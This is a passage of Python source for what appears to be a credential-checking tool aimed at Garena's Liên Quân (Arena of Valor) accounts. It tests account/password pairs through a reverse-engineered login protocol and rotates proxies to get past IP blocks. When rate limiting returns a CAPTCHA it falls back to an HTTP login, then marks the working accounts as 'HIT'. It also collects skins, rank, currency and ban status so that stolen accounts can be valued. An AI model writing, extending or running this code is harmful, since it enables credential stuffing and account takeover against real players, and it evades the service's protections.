    '19015': 'Tulen Satoru Gojo', '19508': 'Enzo Kurapika',
    '19906': 'Elando rr Tuxedo Mask', '51305': 'Zata Tác gia đương đại',
    '52008': 'Veres Phù thủy trang điểm', '17706': 'Lindis Đồng phục Shihakusho',
    '19015': 'Tulen Satoru Gojo', '19508': 'Enzo Kurapika',
    '19906': "Eland'orr-Tuxedo", '50118': "Tel'Annas Jujutsu Sorcerer",
    '51305': 'Zata Tác gia đương đại', '52105': 'Florentino Seven',
    '52108': 'Florentino Bá vương Âm nhạc', '52204': 'Errol Genos',
    '52407': 'Capheny Harley Quinn', '52415': 'Capheny Bugcag Assemble',
    '52809': 'Qi Milim Nava', '53107': 'Keera Nezuko Kamado',
    '53308': 'Laville Chiến thần MOBA', '53311': 'Laville Thợ Săn Truy Ảnh',
    '53701': 'Allain Hắc kiếm sĩ Kirito', '53702': 'Allain Kirito',
    '53806': 'Iggy Rimuru Tempest', '54002': 'Bright Toshiro Hitsugaya',
    '54309': 'Aya Cinnamoroll s Dream', '54402': 'Yan Tanjiro Kamado',
    '59702': 'Biron Yuji Itadori', '15016': 'Nakroth Levi',
}

SKIN_OTHER = {
    '56702': 'Erin Cực địa tinh linh', '56705': 'Erin Đồng dao mây trắng',
    '56801': 'Ming Thầy tướng', '56802': 'Ming 56802',
    '59601': 'Goverra 59601', '59701': 'Biron Võ sĩ Giác đấu',
    '59801': 'Bolt Baron Lôi vệ',
}
def _skin_label(sid: str) -> str:
    """Tên skin từ DB Baong19 (ưu tiên SS > SSS > Anime > Other)."""
    if sid in SKIN_SS:
        return SKIN_SS[sid]
    if sid in SKIN_SSS:
        return SKIN_SSS[sid]
    if sid in SKIN_ANIME:
        return SKIN_ANIME[sid]
    if sid in SKIN_OTHER:
        return SKIN_OTHER[sid]
    return ""


def _classify_skins(owned_ids: list) -> dict:
    """Classify owned skin IDs into SS/SSS/ANIME/OTHER tiers and count unique champions."""
    ss_list, sss_list, anime_list, other_list = [], [], [], []
    prefixes = set()
    for item_id in owned_ids:
        sid = str(item_id)
        if sid in SKIN_SS:
            ss_list.append(SKIN_SS[sid])
        elif sid in SKIN_SSS:
            sss_list.append(SKIN_SSS[sid])
        elif sid in SKIN_ANIME:
            anime_list.append(SKIN_ANIME[sid])
        elif sid in SKIN_OTHER:
            other_list.append(SKIN_OTHER[sid])
        prefix = sid[:3] if len(sid) >= 3 else sid
        prefixes.add(prefix)
    return {
        'total_skins': len(owned_ids),
        'total_champs': len(prefixes),
        'ss': len(ss_list), 'ss_list': ss_list,
        'sss': len(sss_list), 'sss_list': sss_list,
        'anime': len(anime_list), 'anime_list': anime_list,
        'other': len(other_list), 'other_list': other_list,
    }

def _aov_partition_candidates(_region: str = "VN"):
    """Partition shop LQ / weeklyreport. Ghi đè: AOV_PARTITION=1011."""
    ov = (os.environ.get("AOV_PARTITION") or "").strip()
    if ov.isdigit():
        return [int(ov)]
    return [1011, 1012]


def _fetch_sale_skins(access_token: str, proxy=None, region: str = "VN") -> dict:
    if not HAS_REQUESTS or not access_token:
        return {}
    import time as _time

    gql_query_short = "query getUser { getUser { id name profile { ownedItemIdList cp } } }"
    gql_query_full = """query getUser {
  getUser {
    id
    name
    icon
    profile {
      id
      shopItems
      boxItems
      flippedSlots
      discount
      cp
      userPack {
        id
        tcid
        packId
        claimedSeq
        startTime
        duration
        box_count
        __typename
      }
      pickedItem
      discountList
      isBuy
      ownedItemIdList
      __typename
    }
    __typename
  }
}
"""

    hdr_cb_desktop = {
        "User-Agent": _SALE_LQ_DESKTOP_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.5",
        "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }

    def _hdr_gql_desktop():
        return {
            "accept": "*/*",
            "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.5",
            "content-type": "application/json",
            "origin": "https://sale.lienquan.garena.vn",
            "priority": "u=1, i",
            "referer": "https://sale.lienquan.garena.vn/",
            "sec-ch-ua": '"Google Chrome";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": _SALE_LQ_DESKTOP_UA,
        }

    hdr_cb_mobile = {
        "User-Agent": _AOV_MOBILE_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    hdr_gql_mobile = {
        "User-Agent": _AOV_MOBILE_UA,
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://sale.lienquan.garena.vn",
        "Referer": "https://sale.lienquan.garena.vn/",
        "Accept-Language": hdr_cb_mobile["Accept-Language"],
    }

    proxies = _get_http_proxies(proxy)
    parts = _aov_partition_candidates(region)
    if _fetch_lean or _QUIET_BULK:
        parts = parts[:1]

    def _parse_sale_gql_body(body):
        if not isinstance(body, dict):
            return None
        user = (body.get("data") or {}).get("getUser")
        if not user:
            return None
        profile = user.get("profile") or {}
        owned = profile.get("ownedItemIdList") or []
        result = _classify_skins(owned)
        try:
            result["cp"] = int(profile.get("cp") or 0)
        except (TypeError, ValueError):
            result["cp"] = 0
        result["sale_name"] = (user.get("name") or "").strip()
        return result

    _sale_attempts = 1 if (_QUIET_BULK or _fetch_lean) else 2
    for _attempt in range(_sale_attempts):
        for part in parts:
            cb_url = (
                "https://sale.lienquan.garena.vn/login/callback"
                f"?ingame=true&access_token={access_token}&partition={part}"
            )
            gql_full = {
                "operationName": "getUser",
                "variables": {},
                "query": gql_query_full,
            }
            gql_short = {
                "operationName": "getUser",
                "variables": {},
                "query": gql_query_short,
            }

            # 1) Desktop: callback (lấy session / session.sig) → GraphQL giống Chrome Windows
            try:
                sess = _requests.Session()
                if proxy:
                    sess.proxies = proxies
                sess.get(
                    cb_url,
                    headers=hdr_cb_desktop,
                    allow_redirects=True,
                    verify=False,
                    timeout=14,
                )
                _gql_modes = (True,) if (_fetch_lean or _QUIET_BULK) else (False, True)
                for add_token in _gql_modes:
                    h = _hdr_gql_desktop()
                    if add_token:
                        h["Access-Token"] = access_token
                        h["Partition"] = str(part)
                    resp = sess.post(
                        "https://sale.lienquan.garena.vn/graphql",
                        json=gql_full,
                        headers=h,
                        verify=False,
                        timeout=14,
                    )
                    if resp.status_code == 200:
                        try:
                            out = _parse_sale_gql_body(resp.json())
                        except Exception:
                            out = None
                        if out is not None:
                            return out
            except Exception:
                pass

            if not (_fetch_lean or _QUIET_BULK):
                # 2) Mobile: POST chỉ token / callback + token (fallback)
                try:
                    sess = _requests.Session()
                    if proxy:
                        sess.proxies = proxies
                    for with_cookie in (False, True):
                        if with_cookie:
                            sess.get(
                                cb_url,
                                headers=hdr_cb_mobile,
                                allow_redirects=True,
                                verify=False,
                                timeout=13,
                            )
                        h = dict(hdr_gql_mobile)
                        h["Access-Token"] = access_token
                        h["Partition"] = str(part)
                        resp = sess.post(
                            "https://sale.lienquan.garena.vn/graphql",
                            json=gql_short,
                            headers=h,
                            verify=False,
                            timeout=13,
                        )
                        if resp.status_code != 200:
                            continue
                        try:
                            out = _parse_sale_gql_body(resp.json())
                        except Exception:
                            out = None
                        if out is not None:
                            return out
                except Exception:
                    pass
        if not _QUIET_BULK and not _fetch_lean:
            _time.sleep(0.45)
    return {}

# Bảng map AOV rank_id -> số sao Cao Thủ
# Dựa trên rank_config thực tế từ weeklyreport API
# Key = rank_id (int), Value = stars (1-5)
_AOV_MASTER_STARS: dict = {
    # Các giá trị phổ biến gặp trong thực tế — bổ sung thêm khi cần
    # Format: rank_id: stars
    # Nhóm Cao Thủ (Master) — thường là 10 rank liên tiếp (2 ID/sao)
    # Sẽ được populate động từ rank_config nếu có field 'stars'/'level'
}

def _parse_weekly_report_body(data: dict) -> dict:
    """Chuẩn hoá JSON /api/profile -> dict name/rank/..."""
    pi = data.get("player_info", {})
    rank_cfg = data.get("rank_config", {})
    rank_name = ""
    rid = pi.get("rank")
    rank_entry = {}
    stars = 0
    # Không dùng "level" ở vòng sao — hay là cấp tài khoản (1–40), dễ nhầm với sao rank.
    for f in ("star", "stars", "rankStar", "rank_stars", "rankLevel"):
        sv = pi.get(f)
        if sv is not None:
            try:
                n = int(sv)
                if n > 0:
                    stars = n
                    break
            except (ValueError, TypeError):
                pass
    if rid is not None and str(rid) in rank_cfg:
        rank_entry = rank_cfg[str(rid)] or {}
        rank_name = rank_entry.get("name", "")
        if not stars:
            for field in (
                "stars",
                "star",
                "level",
                "sub_rank",
                "tier_level",
                "rank_level",
                "sub_level",
                "division",
                "star_count",
            ):
                v = rank_entry.get(field)
                if v is not None:
                    try:
                        n = int(v)
                        if 1 <= n <= 50:
                            stars = n
                            break
                    except (ValueError, TypeError):
                        pass
    if not stars and rid is not None:
        stars = _AOV_MASTER_STARS.get(int(rid), 0)

    # Trích xuất số sao từ report -> rank trend
    if rid is not None:
        rep_rank = data.get("report", {}).get("rank", {})
        found_stars = None
        for period in ("week", "season", "month"):
            trend = rep_rank.get(period, {}).get("trend", [])
            if trend and isinstance(trend, list):
                for item in reversed(trend):
                    if isinstance(item, dict) and item.get("rank") == rid:
                        if "star" in item:
                            try:
                                found_stars = int(item["star"])
                                break
                            except (ValueError, TypeError):
                                pass
            if found_stars is not None:
                break
        if found_stars is not None:
            stars = found_stars

    acc_lv = 0
    for key in (
        "role_level",
        "roleLevel",
        "RoleLevel",
        "game_level",
        "ladder_level",
        "account_level",
        "grade_level",
        "hero_level",
        "ce_level",
        "CeLevel",
        "sumLevel",
        "sum_level",
    ):
        v = pi.get(key)
        if v is None:
            continue
        try:
            n = int(v)
        except (TypeError, ValueError):
            continue
        if 1 <= n <= 40:
            acc_lv = max(acc_lv, n)
    if not acc_lv:
        v = pi.get("level")
        if v is not None:
            try:
                n = int(v)
                if 1 <= n <= 40:
                    acc_lv = n
            except (TypeError, ValueError):
                pass

    return {
        "name": pi.get("name", ""),
        "rank": rank_name or (str(rid) if rid else ""),
        "rank_id": rid,
        "rank_stars": stars,
        "rank_entry": rank_entry,
        "account_level": acc_lv,
    }


def _aov_level_from_nested_obj(obj, depth: int = 0) -> int:
    """Tìm cấp tài khoản 1–40 trong dict/list lồng nhau (API đổi tên field)."""
    if depth > 8 or obj is None:
        return 0
    best = 0
    keys_prio = (
        "role_level",
        "roleLevel",
        "RoleLevel",
        "sumLevel",
        "sum_level",
        "game_level",
        "gameLevel",
        "ladder_level",
        "account_level",
        "hero_level",
        "ce_level",
        "CeLevel",
        "battle_level",
        "BattleLevel",
        "level",
        "lv",
        "Lv",
    )
    if isinstance(obj, dict):
        for k in keys_prio:
            if k not in obj:
                continue
            v = obj[k]
            try:
                n = int(v)
            except (TypeError, ValueError):
                continue
            if 1 <= n <= 40:
                best = max(best, n)
        for v in obj.values():
            if isinstance(v, (dict, list)):
                best = max(best, _aov_level_from_nested_obj(v, depth + 1))
    elif isinstance(obj, list):
        for it in obj:
            best = max(best, _aov_level_from_nested_obj(it, depth + 1))
    return best


def _aov_level_from_connect_payload(payload) -> int:
    if not isinstance(payload, dict):
        return 0
    boxes = [payload]
    d = payload.get("data")
    if isinstance(d, dict):
        boxes.append(d)
        for k in ("user", "role", "player", "profile", "game", "game_info", "aov", "local_requirement"):
            x = d.get(k)
            if isinstance(x, dict):
                boxes.append(x)
    return max((_aov_level_from_nested_obj(b) for b in boxes), default=0)


def _aov_qh_from_connect_payload(payload) -> int:
    """Quân Huy / CP từ connect user-info nếu shop GraphQL trả 0."""
    if not isinstance(payload, dict):
        return 0
    boxes = [payload]
    d = payload.get("data")
    if isinstance(d, dict):
        boxes.append(d)
        for k in ("user", "role", "player", "profile", "game", "wallet", "currency"):
            x = d.get(k)
            if isinstance(x, dict):
                boxes.append(x)
    keys_qh = ("qh", "quanhuy", "quan_huy", "cp", "voucher", "vouchers", "balance", "coin", "currency")
    best = 0
    for box in boxes:
        for kk in keys_qh:
            v = box.get(kk)
            if v is None:
                continue
            if isinstance(v, dict):
                for subk in ("total", "amount", "balance", "value", "count"):
                    sv = v.get(subk)
                    if sv is not None:
                        try:
                            n = int(sv)
                            if n > best:
                                best = n
                        except (TypeError, ValueError):
                            pass
                continue
            try:
                n = int(v)
            except (TypeError, ValueError):
                continue
            if n > best:
                best = n
    return best if best > 0 else 0


def _apply_weekly_to_result(result: dict, wm: dict) -> None:
    """Ghi name/rank từ weeklyreport (dict đã parse) vào result."""
    if not wm:
        return
    result["aov_name"] = wm.get("name", "")
    rank_base = wm.get("rank", "")
    rank_stars = int(wm.get("rank_stars") or 0)
    result["aov_rank_id"] = wm.get("rank_id")
    result["aov_rank_stars"] = rank_stars
    result["aov_rank_entry"] = wm.get("rank_entry", {})
    if rank_base:
        r_low = rank_base.lower()
        if "cao th" in r_low or "master" in r_low or "chiến tướng" in r_low or "chien tuong" in r_low:
            result["aov_rank"] = f"{rank_base} {rank_stars}"
        else:
            result["aov_rank"] = rank_base
    try:
        wl = int(wm.get("account_level") or 0)
    except (TypeError, ValueError):
        wl = 0
    if wl > 0:
        result["aov_level"] = max(int(result.get("aov_level") or 0), wl)


def _enrich_result_from_weekly_gaps(result: dict, wm: dict) -> None:
    """Bổ sung weekly khi lần 1 thiếu (race/partition), không xóa field đã có."""
    if not wm:
        return
    if (wm.get("name") or "").strip() and not (result.get("aov_name") or "").strip():
        result["aov_name"] = wm.get("name", "")
    rb = (wm.get("rank") or "").strip()
    if rb and not (result.get("aov_rank") or "").strip():
        rank_stars = int(wm.get("rank_stars") or 0)
        result["aov_rank_id"] = wm.get("rank_id")
        result["aov_rank_stars"] = rank_stars
        result["aov_rank_entry"] = wm.get("rank_entry", {})
        if rb:
            r_low = rb.lower()
            if "cao th" in r_low or "master" in r_low or "chiến tướng" in r_low or "chien tuong" in r_low:
                result["aov_rank"] = f"{rb} {rank_stars}"
            else:
                result["aov_rank"] = rb
    try:
        wl = int(wm.get("account_level") or 0)
    except (TypeError, ValueError):
        wl = 0
    if wl > 0:
        result["aov_level"] = max(int(result.get("aov_level") or 0), wl)


def _merge_kientuong_snapshot(result: dict, kt: dict) -> None:
    """Ghi snapshot Kiến Tường (level/ban/rank) vào result."""
    if not kt:
        return
    try:
        klv = int(kt.get("level") or 0)
    except (TypeError, ValueError):
        klv = 0
    if klv > 0:
        result["aov_level"] = max(int(result.get("aov_level") or 0), klv)
    result["aov_reg_time"] = kt.get("register_time", "")
    result["aov_banned"] = "YES" if _is_yes(kt.get("banned", "NO")) else "NO"
    result["aov_ban_time"] = kt.get("ban_time", "")
    result["aov_unban_time"] = kt.get("unban_time", "")
    kt_stars = int(kt.get("rank_stars") or 0)
    kt_rank = kt.get("rank")
    if kt_stars > 0:
        result["aov_rank_stars"] = kt_stars
        r_base = result.get("aov_rank") or kt_rank or "Cao Thủ"
        r_base = re.sub(r"\s*\d+$", "", str(r_base))
        r_low = r_base.lower()
        if "cao th" in r_low or "master" in r_low:
            result["aov_rank"] = f"{r_base} {kt_stars}"
        else:
            result["aov_rank"] = r_base
    elif not result.get("aov_rank") and kt_rank:
        rank_base = kt_rank
        r_low = rank_base.lower()
        result["aov_rank_stars"] = kt_stars
        if kt_stars and ("cao th" in r_low or "master" in r_low):
            result["aov_rank"] = f"{rank_base} {kt_stars}"
        else:
            result["aov_rank"] = rank_base
        result["aov_rank_source"] = "kientuong"
    result["_kt_player"] = kt.get("_raw_player", {})


def _weekly_player_info_nonempty(pi) -> bool:
    if not isinstance(pi, dict):
        return False
    if (pi.get("name") or "").strip():
        return True
    if pi.get("openid"):
        return True
    for k in ("player_id", "id", "uid", "role_id", "roleId", "game_open_id"):
        v = pi.get(k)
        if v not in (None, "", 0, "0"):
            return True
    return False


def _fetch_weekly_profile(access_token: str, proxy=None, region: str = "VN") -> dict:
    """weeklyreport.moba.garena.vn: player name, rank, rank_id, stars."""
    if not HAS_REQUESTS or not access_token:
        return {}
    proxies = _get_http_proxies(proxy)
    ua = _AOV_MOBILE_UA
    last_parsed = None
    try:
        for part in _aov_partition_candidates(region):
            headers = {
                "Access-Token": access_token,
                "Partition": str(part),
                "User-Agent": ua,
            }
            resp = _requests.get(
                "https://weeklyreport.moba.garena.vn/api/profile",
                headers=headers,
                verify=False,
                timeout=11,
                proxies=proxies,
            )
            if resp.status_code != 200:
                continue
            data = resp.json()
            if not isinstance(data, dict):
                continue
            parsed = _parse_weekly_report_body(data)
            last_parsed = parsed
            if _weekly_player_info_nonempty(data.get("player_info") or {}):
                return parsed
        return last_parsed or {}
    except Exception:
        pass
    return {}

def _fetch_aov_user_info(access_token: str, region: str = "VN", proxy=None) -> dict:
    if not HAS_REQUESTS or not access_token:
        return {}
    try:
        params = {"app_id": str(LIEN_QUAN_APP_ID), "region": region or "VN", "access_token": access_token}
        headers = {
            "User-Agent": _AOV_MOBILE_UA,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.9,en;q=0.8",
        }
        resp = _requests.get(
            "https://connect.garena.com/api/v1/game/local-requirement/user-info",
            params=params,
            headers=headers,
            verify=False,
            timeout=10,
            proxies=_get_http_proxies(proxy),
        )
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict):
                return data
    except Exception:
        pass
    return {}

def _fetch_kientuong_player(sock, session_key: bytes, proxy=None) -> dict:
    """kientuong.lienquan.garena.vn: level, registerTime, banInfo."""
    if not HAS_REQUESTS:
        return {}
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, "https://kientuong.lienquan.garena.vn/auth/login/callback") +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        redirect = fields[2].decode('utf-8') if 2 in fields else ''
        if not redirect:
            return {}
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect, allow_redirects=False, verify=False, timeout=10)
        if not sess.cookies:
            return {}
        resp2 = sess.get("https://kientuong.lienquan.garena.vn/api/player/get",
                         verify=False, timeout=10)
        if resp2.status_code == 200:
            player = resp2.json().get('player', {})
            import datetime
            reg_ts = player.get('registerTime')
            reg_str = datetime.datetime.fromtimestamp(reg_ts).strftime('%H:%M:%S %d-%m-%Y') if reg_ts else ''
            # Lấy rank từ kientuong (fallback cho weeklyreport)
            rank_str = ''
            rank_stars_kt = 0
            for rf in ('rankName', 'rank_name', 'rank', 'tier', 'tierName'):
                v = player.get(rf)
                if v:
                    if isinstance(v, dict):
                        rank_str = (v.get('name') or v.get('rankName') or v.get('tierName') or '').strip()
                        rank_stars_kt = int(v.get('stars', 0) or v.get('star', 0) or v.get('level', 0) or 0)
                    elif isinstance(v, str) and v.strip():
                        rank_str = v.strip()
                    if rank_str:
                        break
            # Gộp nhiều shape ban payload để tránh miss khi API đổi field.
            ban_payload = [
                player.get('banInfo'),
                player.get('punishInfo'),
                player.get('punishment'),
                {
                    'isBan': player.get('isBan'),
                    'isBanned': player.get('isBanned'),
                    'banned': player.get('banned'),
                    'ban': player.get('ban'),
                    'banStatus': player.get('banStatus'),
                    'status': player.get('status'),
                    'state': player.get('state'),
                    'endTime': player.get('endTime'),
                    'banEndTime': player.get('banEndTime'),
                    'unbanTime': player.get('unbanTime'),
                    'expireAt': player.get('expireAt'),
                    'expiredAt': player.get('expiredAt'),
                    'banTime': player.get('banTime'),
                }
            ]
            ban_start_raw = (
                player.get('banTime') or player.get('startTime') or player.get('banStartTime')
            )
            ban_end_raw = (
                player.get('unbanTime') or player.get('endTime') or player.get('banEndTime') or
                player.get('expireAt') or player.get('expiredAt')
            )
            now_ts = int(time.time())
            ban_start_ts = _norm_unix_ts(ban_start_raw)
            ban_end_ts = _norm_unix_ts(ban_end_raw)
            banned_flag = _is_banned_info(ban_payload)
            nested_ban_flag, nested_future_end = _scan_ban_signals(player, now_ts=now_ts)
            if nested_ban_flag:
                banned_flag = True
            if nested_future_end and (nested_future_end > ban_end_ts):
                ban_end_ts = nested_future_end
                ban_end_raw = nested_future_end
            # Fallback: if ban window says currently active, force BAN.
            if not banned_flag:
                if ban_end_ts and ban_end_ts > now_ts and (not ban_start_ts or ban_start_ts <= now_ts):
                    banned_flag = True
            ban_start_fmt = _fmt_unix_ts_vi(ban_start_raw)
            ban_end_fmt = _fmt_unix_ts_vi(ban_end_raw)

            lv_nested = _aov_level_from_nested_obj(player)
            try:
                lv_flat = int(player.get("level") or 0)
            except (TypeError, ValueError):
                lv_flat = 0
            lv_final = max(lv_nested, lv_flat)

            return {
                'level': lv_final,
                'register_time': reg_str,
                'banned': 'YES' if banned_flag else 'NO',
                'ban_time': ban_start_fmt,
                'unban_time': ban_end_fmt,
                'rank': rank_str,
                'rank_stars': rank_stars_kt,
                '_raw_player': player,
            }
    except Exception:
        pass
    return {}

def _translate_aov_rank(rank_str: str) -> str:
    if not rank_str: return rank_str
    s = rank_str.lower()
    if 'บรอนซ์' in s or 'bronze' in s or '青銅' in s: return 'Đồng'
    if 'ซิลเวอร์' in s or 'silver' in s or '白銀' in s: return 'Bạc'
    if 'โกลด์' in s or 'gold' in s or '黃金' in s: return 'Vàng'
    if 'แพลทินัม' in s or 'platinum' in s or '鉑金' in s: return 'Bạch Kim'
    if 'ไดมอนด์' in s or 'diamond' in s or '鑽石' in s: return 'Kim Cương'
    if 'คอมมานเดอร์' in s or 'commander' in s or '星耀' in s: return 'Tinh Anh'
    if 'กลอเรียสรูเลอร์' in s or 'glorious ruler' in s: return 'Thách Đấu'
    if 'ซูพรีมคอนเควอร์เรอร์' in s or 'supreme conqueror' in s or '璀璨傳說' in s: return 'Chiến Tướng'
    if 'คอนเควอร์เรอร์' in s or 'conqueror' in s or 'master' in s or '戰場傳說' in s: return 'Cao Thủ'
    return rank_str

# ── Core check ────────────────────────────────────────────────────────────────
_PROXY_ERRORS = (
    'Proxy closed connection',
    'Proxy CONNECT failed',
    'No connection could be made',
    'Connection dropped',
    'target machine actively refused',
    'A connection attempt failed',
    'connected party did not properly respond',
    'getaddrinfo failed',
    'Connection refused',
)

_TIMEOUT_ERRORS = ('timed out', 'TimeoutError')


def _is_proxy_error(detail: str) -> bool:
    if not detail:
        return False
    return any(err in detail for err in _PROXY_ERRORS)


def _is_timeout_error(detail: str) -> bool:
    if not detail:
        return False
    return any(err in detail for err in _TIMEOUT_ERRORS)


def _is_port_exhaustion(detail: str) -> bool:
    if not detail:
        return False
    return '10048' in detail or 'Only one usage' in detail


def check_login(account: str, password: str, timeout: int = 7, fetch_info: bool = False, proxy=None, debug: bool = False) -> dict:
    result = None
    proxy_fails = 0
    no_proxy_mode = (proxy is None and not _has_proxy_pool())
    max_retries = max(1, LOGIN_RETRIES_NO_PROXY if no_proxy_mode else LOGIN_RETRIES_PROXY)

    for _retry in range(max_retries):
        if proxy is None and _has_proxy_pool():
            proxy = _next_proxy()

        result = _check_login_once(account, password, timeout, fetch_info, proxy, debug=debug)
        detail = result.get('detail', '')
        status = result.get('status', '')

        result['_proxy_used'] = proxy
        if status == 'HIT':
            return result
        if 'result=3' in detail:
            return result
        if 'result=101' in detail:
            return result
        if 'result=367' in detail:
            return result

        if _is_port_exhaustion(detail):
            time.sleep(0.3)
            proxy = _next_proxy() if _has_proxy_pool() else None
            continue

        if status == 'TIMEOUT' and no_proxy_mode:
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
            return result

        if status in ('ERROR', 'TIMEOUT') or _is_proxy_error(detail):
            proxy_fails += 1
            proxy = _next_proxy() if _has_proxy_pool() else None
            time.sleep(0.3)
            continue

        if detail == 'Empty LoginReply data':
            proxy = _next_proxy() if _has_proxy_pool() else None
            continue

        return result

    if result:
        if no_proxy_mode and result.get('status') == 'TIMEOUT':
            result['status'] = 'PORT_BLOCKED'
            result['detail'] = 'Port 19000 bi chan (ISP/Garena ban IP). Dung proxy de bypass.'
        elif proxy_fails >= 3:
            result['status'] = 'PROXY_FAIL'
            result['detail'] = f'proxy_error x{proxy_fails}'
    return result

def _check_login_once(account: str, password: str, timeout: int = 20, fetch_info: bool = False, proxy=None, debug: bool = False) -> dict:
    global _HOST_IP, _fetch_lean
    _fetch_lean = not debug
    # Acquire connection slot — giai phong tu dong khi ham ket thuc
    _conn_sem.acquire()
    sock = None
    dbg = {}
    try:
        host_ip = _resolve_host_ip()
        if proxy:
            sock = _connect_via_proxy(proxy, host_ip, PORT, timeout)
        else:
            # Retry toi da 3 lan neu bi WinError 10048 (Windows het ephemeral port)
            for _attempt in range(3):
                try:
                    sock = _make_fast_socket(timeout)
                    sock.connect((host_ip, PORT))
                    break  # ket noi thanh cong
                except OSError as _e:
                    try: sock.close()
                    except: pass
                    sock = None
                    if getattr(_e, 'winerror', None) == 10048 and _attempt < 2:
                        time.sleep(0.5 * (_attempt + 1))
                        continue
                    raise

        # Step 1: CMD_LOGIN_PREPARE (256)
        rand_key  = os.urandom(16)
        prep_body = _build_login_prepare(account, rand_key)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({
                "prepare_result": result_code,
                "prepare_body_len": len(body) if body else 0,
            })
        if result_code != 0:
            # Ánh xạ mã lỗi từ GxxData.Constant.Result (login/d.java AnonymousClass8)
            # 1=ERROR_AUTH(sai pass), 2=ACCOUNT_NOT_EXIST, 3=ERROR_CAPTCHA(rate-limit),
            # 4=ERROR_AUTH_USER_BAN, 5=ERROR_AUTH_SECURITY_BAN
            
            if result_code != 0:
                http_r = {}
                if result_code == 3 and HAS_REQUESTS:
                    # CAPTCHA/rate-limit → thử fallback qua HTTP API
                    if debug:
                        dbg["prepare_captcha_fallback"] = True
                    http_r = _http_login_garena(account, password, proxy=proxy, timeout=timeout)
                    if 'access_token' in http_r:
                        out = {
                            "account": account, "password": password,
                            "status": "HIT", "_login_method": "http",
                            "aov_token": http_r["access_token"],
                        }
                        if debug:
                            dbg["http_fallback_ok"] = True
                            out["debug"] = dbg
                        return out
                    err_code = http_r.get('error_code', '')
                    if err_code in ('invalid_grant', 'access_denied'):
                        out = {"account": account, "password": password,
                               "status": "INVALID", "detail": f"CAPTCHA+HTTP sai mật khẩu ({err_code})"}
                    elif err_code == 'account_not_exist':
                        out = {"account": account, "password": password,
                               "status": "NOT_FOUND", "detail": "CAPTCHA+HTTP không tìm thấy account"}
                    else:
                        out = {"account": account, "password": password,
                               "status": "CAPTCHA", "detail": f"TCP_CAPTCHA HTTP_ERR={http_r.get('error','')}"}
                    if debug:
                        dbg["http_fallback_err"] = http_r
                        out["debug"] = dbg
                    return out

                # Các loi khac (sai pass, ban, khong tim thay, ...)
                status_map = {
                    1: ("INVALID",    f"WRONG_PASSWORD result={result_code}"),
                    2: ("NOT_FOUND",  f"ACCOUNT_NOT_EXIST result={result_code}"),
                    3: ("CAPTCHA",    f"PREPARE_CAPTCHA result={result_code}"),
                    4: ("BANNED",     f"USER_BANNED result={result_code}"),
                    5: ("SEC_BANNED", f"SECURITY_BANNED result={result_code}"),
                }
                status, detail = status_map.get(result_code, ("MISS", f"PREPARE_FAIL result={result_code}"))
                out = {"account": account, "password": password, "status": status, "detail": detail}
                if debug:
                    out["debug"] = dbg
                return out

            # result_code == 0: CAPTCHA da giai thanh cong hoac khong bi CAPTCHA → tiep tuc Step 2

        prep_reply = _proto_decode(body)
        reply_key  = prep_reply.get(1, b'')
        reply_data = prep_reply.get(2, b'')
        if debug:
            dbg.update({
                "prepare_has_key": bool(reply_key),
                "prepare_has_data": bool(reply_data),
                "prepare_key_len": len(reply_key) if isinstance(reply_key, (bytes, bytearray)) else 0,
                "prepare_data_len": len(reply_data) if isinstance(reply_data, (bytes, bytearray)) else 0,
            })
        if not reply_key or not reply_data:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "Empty LoginPrepareReply"}
            if debug:
                out["debug"] = dbg
            return out

        prep_data   = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt        = prep_data.get(1, b'')
        verify_code = prep_data.get(2, b'')
        salt        = salt.decode('utf-8')        if isinstance(salt,        bytes) else salt
        verify_code = verify_code.decode('utf-8') if isinstance(verify_code, bytes) else verify_code
        if debug:
            dbg.update({
                "salt_len": len(salt) if isinstance(salt, str) else 0,
                "verify_len": len(verify_code) if isinstance(verify_code, str) else 0,
            })

        # Step 2: CMD_LOGIN (257)
        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({
                "login_result": result_code,
                "login_body_len": len(body) if body else 0,
            })
        if result_code != 0:
            out = {"account": account, "password": password,
                   "status": "INVALID", "detail": f"LOGIN_FAIL result={result_code}"}
            if debug:
                out["debug"] = dbg
            return out

        login_reply = _proto_decode(body)
        enc_reply   = login_reply.get(1, b'')
